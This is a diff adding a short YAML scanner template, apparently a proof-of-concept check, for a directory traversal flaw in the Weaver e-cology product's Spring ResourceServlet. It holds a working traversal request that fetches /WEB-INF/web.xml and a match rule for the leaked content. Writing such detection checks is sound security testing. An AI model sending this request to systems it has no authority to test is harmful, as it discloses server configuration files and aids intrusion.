@@ -1,0 +1,9 @@
+name: ecology-springframework-directory-traversal
+type: directory traversal
+rules:
+  - method: GET
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101
+    path: weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
+    expression: result.contains("<url-pattern>/weaver/")
+author: ty
